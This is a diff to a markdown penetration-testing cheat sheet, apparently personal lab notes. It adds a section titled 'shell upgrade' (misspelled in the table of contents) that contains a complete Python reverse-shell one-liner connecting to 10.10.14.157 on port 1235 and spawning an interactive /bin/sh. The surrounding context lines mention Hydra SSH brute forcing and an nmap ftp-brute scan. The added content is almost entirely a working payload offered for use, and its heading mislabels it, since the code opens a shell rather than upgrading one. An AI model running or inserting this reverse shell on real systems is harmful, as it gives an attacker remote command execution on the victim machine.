@@ -20,6 +20,7 @@
 - [8. SSH](#ssh)
 - [8. Hydra](#hydra) - Brute force attack on ssh
 - [9.FTP](#ftp)
+- [10. shell upgreade](#shell)
 - [10. Password Cracking](/hash_cracking.md)
 - [11. RDP-3389](#rdp)
 - [12. SMB](/smb.md)
@@ -179,7 +180,11 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
+# 10. shell upgrade <a name="shell"></a>
 
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
 # 10. [Password Cracking](/hash_cracking.md)
 
